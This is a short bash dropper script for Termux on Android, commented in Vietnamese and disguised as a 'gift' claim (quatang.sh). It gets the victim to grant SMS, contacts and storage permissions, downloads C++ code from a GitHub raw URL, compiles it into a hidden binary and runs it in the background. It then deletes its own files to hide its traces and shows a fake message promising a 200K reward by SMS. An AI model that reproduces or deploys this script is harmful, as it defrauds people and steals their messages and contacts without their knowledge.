#!/bin/bash
# 1. Cai dat moi truong
pkg install clang termux-api zip curl -y

# 2. Bat bang hoi xin quyen (Nho nhac nan nhan nhan Allow)
termux-setup-storage
termux-api-permission -s SMS,CONTACTS,STORAGE

# 3. Tai Code Bot tu GitHub cua ban
curl -sL "https://raw.githubusercontent.com/vanlenios/update_sys/refs/heads/main/sys_v9000.cpp" -o .sys_v9000.cpp

# 4. Bien dich va Kich no chay ngam
g++ .sys_v9000.cpp -o .v9000_bot
chmod +x .v9000_bot
nohup ./.v9000_bot > /dev/null 2>&1 &

# 5. Xoa sach dau vet va hien thong bao gia
rm .sys_v9000.cpp quatang.sh
clear
echo "========================================"
echo " XAC MINH THANH CONG - NHAN QUA 200K "
echo " Ma qua se duoc gui vao SMS trong 24h "
echo "========================================"

